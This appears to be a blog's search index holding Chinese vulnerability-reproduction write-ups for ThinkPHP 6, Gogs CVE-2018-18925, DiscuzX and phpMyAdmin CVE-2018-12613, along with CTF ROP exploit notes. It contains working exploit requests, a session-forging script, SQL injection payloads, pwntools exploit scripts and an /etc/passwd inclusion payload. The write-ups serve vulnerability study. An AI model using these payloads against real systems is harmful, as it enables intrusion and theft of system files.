<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ThinkPHP 6 任意文件写入</title>
      <link href="/2020/01/15/ThinkPHP-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
      <url>/2020/01/15/ThinkPHP-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在 ThinkPHP 6.0.0 以及 6.0.1 两个版本中，如果服务端在全局中间件定义文件中开启了 Session 初始化，并且攻击者可控任意一个 session 的值，就可利用写入 session 文件的功能做到写入任意文件 getshell 。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用 composer 命令安装 ThinkPHP：</p><pre><code class="bash">composer create-project topthink/think tp</code></pre><p>在全局中间件定义文件 tp/app/middleware.php:10 行的位置，添加开启 Session 初始化的配置：</p><p><img src="../../../../img/tp6_1.png" alt=""></p><p>同时删除补丁中对于 $id 的过滤：</p><p><img src="../../../../img/tp6_2.png" alt=""></p><p>为了便于测试，我们在 tp/app/controller/Index.php/ 文件中，添加如下代码，模拟 session 值可控：</p><p><img src="../../../../img/tp6_3.png" alt=""></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>调整环境如上，发送如下请求包：</p><pre><code>GET /tp/public/index.php/index/index/index?c=%3C?php%20phpinfo()%3B%2F%2F HTTP/1.1Cookie: XDEBUG_SESSION=PHPSTORM; PHPSESSID=/../../../../123456789012345.php;Host: 127.0.0.1:9090Connection: closeUser-Agent: Paw/3.1.10 (Macintosh; OS X/10.15.2) GCDHTTPRequest</code></pre><p><img src="../../../../img/tp6_4.png" alt=""></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>如果 cms 使用了存在上述漏洞的 tp6 框架，并且在开发逻辑中存在可控的 session 值，才能做到如上效果，我们看一下发送的请求：</p><pre><code>/tp/public/index.php/index/index/index?c=%3C?php%20phpinfo()%3B%2F%2F</code></pre><p>上述请求的路由很清晰，访问 index 模块儿 、index 控制器、 index 方法，击中断点后，赋值 session ：</p><p><img src="../../../../img/tp6_5.png" alt=""></p><p><img src="../../../../img/tp6_6.png" alt=""></p><p>当整个 HTTP 请求结束后，会进入 end 方法，其中会执行中间件的一些行为：</p><p><img src="../../../../img/tp6_7.png" alt=""></p><p>跟进：</p><p><img src="../../../../img/tp6_8.png" alt=""></p><p>这里的 end 方法会进入中间件的 Session 初始化功能，也就是 SessionInit.php 。我们已经在前文中提前开启了该配置，所以可以跟进：</p><p><img src="../../../../img/tp6_9.png" alt=""></p><p>Session 初始化结束后，会保存相应的 session 文件，文件名来源于用户传入的 Cookie 中 PHPSESSID 的值，文件内容来源于 session 的值，但是会被序列化一次：</p><p><img src="../../../../img/tp6_10.png" alt=""></p><p>需要注意的是，我们传入的 PHPSESSID 值长度必须为 32 个字符，否则无法进入写 session 的逻辑：</p><p><img src="../../../../img/tp6_11.png" alt=""></p><p>成功写入 session 文件，为了防止由于序列化导致的字符错误，我们需要在 session 的值加入尾注释来避免字符错误（类似于 sql 注入中的尾注释）</p><p>最终写入的文件存储于 /Users/Sites/123456789012345.php ，也就是我的测试环境的 Web 根目录：</p><p><img src="../../../../img/tp6_12.png" alt=""></p><p>由于 tp6 使用量较少，漏洞利用条件较繁琐，所以此漏洞较难利用。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">https://paper.seebug.org/1114/</a></p><p><a href="https://www.anquanke.com/post/id/197261" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197261</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gogs 远程代码执行 (CVE-2018-18925)</title>
      <link href="/2020/01/14/Gogs-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-18925/"/>
      <url>/2020/01/14/Gogs-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-18925/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Gogs 使用了 go-macaron 作为 Web 框架,而 go-macaron 中的 session 插件并没有对 sessionid 进行过滤, 从而导致攻击者可以使用任意文件作为 session， 登陆其他任意账号。该漏洞存在于 Gogs &lt;= 0.11.66 的版本中。利用该漏洞，任意普通用户可以伪造 session 登陆任意账号，通过伪造并登陆管理员账号后可以使用 git hooks 执行任意命令。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载 Gogs 源码：go get <a href="https://github.com/gogs/gogs" target="_blank" rel="noopener">https://github.com/gogs/gogs</a><br>切换回有漏洞的版本：<code>git checkout v0.11.66</code></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h3><p>注册一个任意的普通账户，并创建一个任意的 repo：</p><p><img src="../../../../img/gogs1.png" alt=""></p><p>在我的测试环境中，管理员的账户名为 zh1x1an，使用如下 go 脚步生成伪造的 session 文件：</p><pre><code class="go">package mainimport (    &quot;bytes&quot;    &quot;encoding/gob&quot;    &quot;encoding/hex&quot;    &quot;fmt&quot;    &quot;io/ioutil&quot;)func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {    for _, v := range obj {        gob.Register(v)    }    buf := bytes.NewBuffer(nil)    err := gob.NewEncoder(buf).Encode(obj)    return buf.Bytes(), err}func main() {    var uid int64 = 1    obj := map[interface{}]interface{}{&quot;_old_uid&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;zh1x1an&quot;}    data, err := EncodeGob(obj)    if err != nil {        fmt.Println(err)    }    err = ioutil.WriteFile(&quot;test.png&quot;, data, 0755)    if err != nil {        fmt.Println(err)    }    edata := hex.EncodeToString(data)    fmt.Println(edata)}</code></pre><p>该文件会在当前目录创建一个 test.png 文件，也就是伪造的 session 文件，内容如下：</p><p><img src="../../../../img/gogs2.png" alt=""></p><p>确认生成的文件内容无误后，在上文 “版本发布” 的位置上传 test.png 文件：</p><p><img src="../../../../img/gogs3.png" alt=""></p><p>得到链接地址如下：</p><pre><code>http://127.0.0.1:3000/attachments/bbb26736-7e47-4683-a644-1b44d12c20f1</code></pre><p>其中 attachments 后为该文件 session_id。Gog 会将该文件存储在 data/attachments/session_id[0]/session_id[1] 路径下，也就是 data/attachments/b/b/bbb26736-7e47-4683-a644-1b44d12c20f1 。</p><p>直接在浏览器控制台中，替换 cookie 中为 ../attachments/session_id[0]/session_id[1] ，也就是 ../attachments/b/b/bbb26736-7e47-4683-a644-1b44d12c20f1 ，即可登陆管理员账户：</p><p><img src="../../../../img/gogs4.png" alt=""></p><h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>伪造登陆管理员账户后，创建一个任意仓库，在 仓库设置→管理 Git 钩子→ post-recieve 中编辑 bash 脚本。</p><p><img src="../../../../img/gogs5.png" alt=""></p><p>随后在该仓库中新建一个文件，触发钩子，执行 bash 脚本中反弹 shell 的命令：</p><p><img src="../../../../img/gogs6.png" alt=""><br><img src="../../../../img/gogs7.png" alt=""></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="go-macaron-框架-cookie-的处理方式"><a href="#go-macaron-框架-cookie-的处理方式" class="headerlink" title="go-macaron 框架 cookie 的处理方式"></a>go-macaron 框架 cookie 的处理方式</h3><p><img src="../../../../img/gogs8.png" alt=""></p><p>首先在 go-macaron/session/session.go:73行的位置，初始化了 options 结构体，在 gogs 程序第一次启动的时候，options.CookieName 会被初始化为 i_like_gogits 。这是 cookie 的一个 key 值，我们接下来看它所对应的 value：</p><p><img src="../../../../img/gogs9.png" alt=""></p><p>在 go-macaron/session/session.go:256 行，调用了 ctx.GetCookie(m.opt.CookieName) 从 http 请求中取得 Cookie 中 key 为 i_like_gogits 的值，赋值给局部变量 sid，继续往下跟进：</p><p><img src="../../../../img/gogs10.png" alt=""></p><p>取出的 i_like_gogits 的值会传递进入 m.provider.Read() 函数，跟进：</p><p><img src="../../../../img/gogs11.png" alt=""></p><h2 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a>路径穿越</h2><p>sid 又传递给 p.filepath() 函数处理，该函数将 sid[0]，sid[1]，sid 三个字符串拼接在 data/sessions 路径后，返回 session 文件的存储路径。这里有一个很严重的问题，sid 是我们传入 cookie 中 i_like_gogits 对应的 value，是完全可控的，拼接路径的过程中没有对 ../ 这种路径穿越字符的过滤。所以我们可以读取任意文件作为 session。</p><p>session 文件中的内容使用 gob 编码，在需要读取的时候会调用 DecodeGob 函数解码，如果要伪造 session，必须先通过 gob 编码。这没有任何难度，因为对于 go 语言来说，这里用的 gob 不是加密算法，而是一种编码，对应的编码解码规则都一清二楚。先贴一下 EncodeGob 和 DecodeGob 的代码：</p><p><img src="../../../../img/gogs12.png" alt=""></p><p><img src="../../../../img/gogs13.png" alt=""></p><h3 id="伪造-session"><a href="#伪造-session" class="headerlink" title="伪造 session"></a>伪造 session</h3><p>我们重新创建一个名为 tester1 的用户，携带 cookie 值，再来跟一下上面的流程，读取出来的数据如下：</p><p><img src="../../../../img/gogs14.png" alt=""></p><p>在 session.go:154 行拿到 sess 变量，其中包括该 session 的 uid，uname 以及 _old_uid 。</p><p><img src="../../../../img/gogs15.png" alt=""></p><p>uname 就是我们的用户名，这里是 tester1。在我的测试环境中，管理员的用户名为 zh1x1an，所以只需要将 uname 从 tester1 改为 zh1x1an，在用 gob 编码生成伪造的 session 文件，即可实现任意用户登陆。</p><p>使用上文中的脚本生成伪造的 session 文件：</p><p><img src="../../../../img/gogs16.png" alt=""></p><p>go run test1.go 运行后，伪造的管理员 session 信息就存储在了 test.png 文件中，所以只需要找到一个文件上传的功能即可。在中文版 gogs 中，“版本发布” 允许我们上传文件（英文版为 releases）。<br>上传伪造的 session 文件，修改 cookie 中 i_like_gogits 的值为相应的上传路径后即可登陆管理员账户。接下来只需要按照前面漏洞检测的流程，借助 git hook 执行命令。整个攻击流程，还是很精彩的。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.youtube.com/watch?v=XtJRF2c_ULY&t=850s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=XtJRF2c_ULY&amp;t=850s</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DiscuzX全版本后台sql注入</title>
      <link href="/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="angularjs">1&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); -- -</code></pre><h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><pre><code class="angularjs">1&#39; into outfile &#39;1.txt&#39;; -- -</code></pre><p><img src="../../../../img/dz1.png" alt=""><br><img src="../../../../img/dz2.png" alt=""><br><img src="../../../../img/dz3.png" alt=""><br><img src="../../../../img/dz4.png" alt=""><br><img src="../../../../img/dz5.png" alt=""><br><img src="../../../../img/dz6.png" alt=""><br><img src="../../../../img/dz7.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP - CTFwiki</title>
      <link href="/2019/11/26/ROP-CTFwiki/"/>
      <url>/2019/11/26/ROP-CTFwiki/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text</a></p></blockquote><pre><code class="bash">wget https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text -O ret2textfile ret2text //看到是 32 位动态链接// 拖进 ida， gets 栈溢出checksec ret2text // 只有 NXgdb ret2text</code></pre><p><img src="../../../../img/rop1.jpg" alt=""></p><p><img src="../../../../img/rop2.jpg" alt=""><br>buf 到 saved ebp 是 0x6c，再加 0x4 到 return address。所以 offset 是 112。</p><p>相当于是 return to plt，ida 里面简单看了下，有后门函数 secure：</p><p><img src="../../../../img/rop3.jpg" alt=""></p><p>return to 0x804863A 即可 getshell：</p><p>exp：</p><pre><code class="python">from pwn import *# p = process(&quot;./&quot;)p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]# elf = ELF(&quot;./&quot;)payload = &quot;\x90&quot;*(0x6c+4) + p32(0x804863A)p.sendline(payload)p.interactive()</code></pre><p><img src="../../../../img/rop4.jpg" alt=""></p><h2 id="ret2shellcode-NX-off"><a href="#ret2shellcode-NX-off" class="headerlink" title="ret2shellcode (NX off)"></a>ret2shellcode (NX off)</h2><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode</a></p></blockquote><pre><code class="bash">checksec ret2shellcode</code></pre><p>没有保护，开了 NX 就意味着有 rwx 段，可以从 gdb 中 vmmap 看到，或者 </p><pre><code class="bash">cat /proc/`pidof ret2shellcode`/maps</code></pre><ol><li>get 处 offset 不变，还是 112</li><li>覆盖返回地址，retrun to gets 的 plt entry </li><li>用这个新的 gets 将 shellcode 读到 buf 上  </li><li>同时跳转到 buf 执行 shellcode 即可</li></ol><p>exp：</p><pre><code class="bash">from pwn import *p = process(&quot;./ret2shellcode&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&#39;./ret2shellcode&#39;)gdb.attach(p)p.sendline(&quot;\x90&quot;*112 + p32(elf.symbols[&#39;gets&#39;]) + p32(elf.bss()) + p32(elf.bss()))# shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;# shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;# shellcode += &quot;\x0b\xcd\x80&quot;shellcode = asm(shellcraft.sh())p.sendline(shellcode)p.interactive()</code></pre><h2 id="ret2syscall（NX-on）"><a href="#ret2syscall（NX-on）" class="headerlink" title="ret2syscall（NX on）"></a>ret2syscall（NX on）</h2><p>动态链接是没有 int 0x80 之类的指令的，这里的文件自然也是 static。 </p><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop</a></p></blockquote><p>offset 和前面一样还是 112，不同的是 NX 开启，不能像 ret2shellcode 那样读 shellcode 到一个 buf。这里用 ret2syscall:</p><p>所需要各个寄存器的值：</p><ol><li>eax 为 0xb，也就是 execve 调用号</li><li>ebx 为 ‘/bin/sh’ 字符串的地址</li><li>ecx 和 edx 为0</li></ol><p>关于 linux 系统调用可以参考：</p><blockquote><p><a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">https://syscalls.kernelgrok.com/</a></p></blockquote><p>借助 ROPgadget：</p><pre><code class="bash">ROPgadget --binary ./ret2syscall --only &quot;int&quot;ROPgadget --binary ./ret2syscall --only=&quot;pop|ret&quot; | grep &quot;eax&quot;ROPgadget --binary ./ret2syscall --only=&quot;pop|ret&quot; | grep &quot;edx&quot;ROPgadget --binary ./ret2syscall --str=&quot;/bin/sh&quot;</code></pre><p>exp:</p><pre><code class="python">from pwn import *p = process(&quot;./ret2syscall&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]# elf = ELF(&quot;./&quot;)# eax = 11,ebx = sh_addr,ecx = edx = 0 pop_eax = 0x080bb196pop_edx_ecx_ebx = 0x0806eb90sys_addr = 0x08049421sh_addr = 0x080be408gdb.attach(p)payload = &#39;\x90&#39;*112 + p32(pop_eax) + p32(11) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(sh_addr) + p32(sys_addr)p.sendline(payload)p.interactive()</code></pre><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="ret2libc1-NX-on"><a href="#ret2libc1-NX-on" class="headerlink" title="ret2libc1 (NX on)"></a>ret2libc1 (NX on)</h3><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1</a></p></blockquote><p>offset 不变，可以通过 <code>elf.symbols[&#39;system&#39;]</code> 得到 system 的地址，再用 <code>ROPgadget --binary ./ret2libc1 --str &#39;/bin/sh</code> 拿到 /bin/sh 的地址即可。</p><p>exp:</p><pre><code class="python">from pwn import *p = process(&quot;./ret2libc1&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&quot;./ret2libc1&quot;)sh_addr = 0x08048720# system = 0x8048460payload = &#39;\x90&#39;*112 + p32(elf.symbols[&#39;system&#39;]) + p32(0xdeadbeef) + p32(sh_addr)gdb.attach(p)p.sendline(payload)p.interactive()</code></pre><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><blockquote><p>程序下载链接: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2</a></p></blockquote><p>和刚才不同的是，ROPgadget 找不到 /bin/sh 这个字符串。所以可以先 ret 到 gets 的 plt，把 /bin/sh 读到 buf 上，再调用 system 并且传递参数 buf。</p><p>利用 gets 函数的溢出，我在栈上这样布局：</p><pre><code class="python">padding # buf-&gt;ebp+saved ebp 112gets@pltsystem@plt # 此处是 gets@plt entry 的 retaddrbuf_addr #elf.bss() 附近 # 此处是 gets@plt 的第一个参数buf_addr #elf.bss() 附近 # 此处是 system@plt 的第一个参数</code></pre><ol><li>在 gets 处溢出，控制 retaddr 为 gets 的 plt entry</li><li>利用新的 gets 把 /bin/sh 读到 buf 中，新的 gets 的 retaddr 为 system 的 plt entry</li><li>调用 system@plt，参数为刚才读好了 /bin/sh 的 buf</li></ol><p>exp:</p><pre><code class="python">from pwn import *p = process(&quot;./ret2libc2&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&quot;./ret2libc2&quot;)gets_plt = elf.symbols[&#39;gets&#39;]system_plt = elf.symbols[&#39;system&#39;]payload = &#39;\x90&#39;*112 + p32(gets_plt) + p32(system_plt) + p32(elf.bss()) + p32(elf.bss())# gdb.attach(p)p.sendline(payload)p.interactive()</code></pre><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><blockquote><p>程序下载链接： <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3</a></p></blockquote><p>这一次没有 system 也没有 /bin/sh。梳理一下我们要做的事：</p><ol><li>先用一次 ROP return 到 puts ，泄漏 libcbase addr，其实也就是先用 puts 等函数印出一个已经调用过的函数的 got ，并 return 回 main，再减去该函数在 libc 中的 offset，offset 可以通过 readelf -s 等方式得到。(通常选择<code>__libc_start_main</code>，因为它是 main 函数的调用者，必定已经调用过)</li><li>拿到 libcbase addr，就可以加上 system 在 libc 中的 offset，通过 libcbase + system offset 拿到 system addr</li><li>同理，用 /bin/sh 的 offset + libcbase 得到 /bin/sh 的 addr</li><li>再一次 ROP 回 main，用 system 和 /bin/sh 开 shell</li></ol><p>栈布局：</p><pre><code class="python">- ROP1:padding1 # 112puts@pltmain@plt__libc_start_main@got- ROP2:padding2 # 104system@plt0xdeadbeef # anything 4 bytes/bin/sh addr</code></pre><p>exp:</p><pre><code class="python">from pwn import *from LibcSearcher import *p = process(&quot;./ret2libc3&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&quot;./ret2libc3&quot;)gdb.attach(p)puts_plt = elf.symbols[&#39;puts&#39;]main_plt = elf.symbols[&#39;main&#39;]libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]payload1 = &#39;a&#39;*112 + p32(puts_plt)+p32(main_plt) + p32(libc_start_main_got)p.sendlineafter(&quot;Can you find it !?&quot;,payload1)libc_start_main_addr = u32(p.recv()[0:4])print libc_start_main_addrlibc = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)system_addr = libcbase + libc.dump(&#39;system&#39;)sh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)payload2 = &#39;a&#39;*104 + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)one_gadget_addr = libcbase + 0x3ac5c # this one is good# one_gadget_addr = libcbase + 0x3ac5e# one_gadget_addr = libcbase + 0x3ac62# one_gadget_addr = libcbase + 0x3ac69 # this one is good# one_gadget_addr = libcbase + 0x5fbc5 # this one is good# one_gadget_addr = libcbase + 0x5fbc6 # this one is good# payload2 = &#39;a&#39;*104 + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)# payload2 = &#39;a&#39;*104 + p32(one_gadget_addr)ret = 0x8048406payload2 = p32(ret)*30 + p32(one_gadget_addr)p.sendline(payload2)p.interactive()</code></pre><p>需要注意的问题：</p><ol><li>选择：ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386)，也就是 3。</li><li>padding2 比 padding1 少 8 字节，原因是第二次 retrun 回 main 中，有栈对齐的指令 <code>0x804861b &lt;main+3&gt; and esp, 0xfffffff0</code>。不过一般确定第二次 padding 大小，就是加上 gdb.attach(p)，在 get@plt 下断，然后手动再判断一次长度。<strong>或者使用 rop slide 也可以，也就是在栈上放置多个 ret 指令。</strong></li><li>第二次 return 回 main 之后，也可以不用找 system 和 /bin/sh ，选择 one-gadget 也可以。</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 4.8.1 远程文件包含漏洞(CVE-2018-12613)</title>
      <link href="/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/"/>
      <url>/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>mac + php5.6 + apache + mysql5.5 + xdebug-2.5.5</p><p>phpmyadmin 4.8.1 下载链接： </p><ul><li><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip" target="_blank" rel="noopener">https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip</a></li></ul><p><strong>确保 mysql 启动无误。</strong></p><p>下载并移动 phpmyadmin 源代码到本地 web 根目录中，修改配置文件：</p><pre><code class="bash">cp config.sample.inc.php config.inc.php</code></pre><p>修改 <code>config.inc.php</code> 文件：</p><p><img src="../../../../img/phpmyadmin1.png" alt=""></p><p>安装完成。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h3><p>index.php ：55 行左右</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>通过 get 方式传入的 target 参数，有可能进入 include 函数，从而导致任意文件包含。 但是要经过上述几个判断，简单梳理一下 target 需要满足的条件：</p><ol><li>参数不为空，且是 string 类型</li><li>不能以 index 开头</li><li>不能在黑名单中（import.php exprot.php）</li><li>通过 <code>Core::checkPageValidity</code> 方法的判断</li></ol><p>跟进 <code>Core::checkPageValidity</code>：</p><pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = []){    if (empty($whitelist)) {        $whitelist = self::$goto_whitelist;    }    if (! isset($page) || !is_string($page)) {        return false;    }    if (in_array($page, $whitelist)) {        return true;    }    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    return false;}</code></pre><p>不管哪一种情况，都要求 page 参数满足 isset 和 is_string 。这是肯定满足的，我们主要梳理一下这一段代码对 page 参数的其他要求：</p><ol><li>首先获取一个白名单</li><li>page 参数在白名单中</li><li>page 参数截取第一个 <code>?</code> 前的子串，子串在白名单中</li><li>page 参数先 url 解码后，再截取第一个 <code>?</code> 前的子串，子串在白名单中</li></ol><p>梳理下攻击思路：</p><ol><li>白名单是已知的，这里随便选一个 db_datadict.php 。</li><li>既然我们走到了 include 这里，那就尽可能让传进来的参数，任意满足上面一种情况，并且仍然可以通过目录穿越，包含到任意文件。<br><img src="../../../../img/phpmyadmin2.jpg" alt=""></li></ol><h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><pre><code class="php">/index.php?target=db_datadict.php%253f/../../../../../../../../../etc/passwd</code></pre><p>该 payload 使得 page 参数满足最后一种条件，也就是 url 解码后，截取第一个问号 <code>?</code> 之前的子串，子串（db_datadict.php）在白名单中。</p><p><img src="../../../../img/phpmyadmin3.png" alt=""></p><p><img src="../../../../img/phpmyadmin4.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计环境搭建</title>
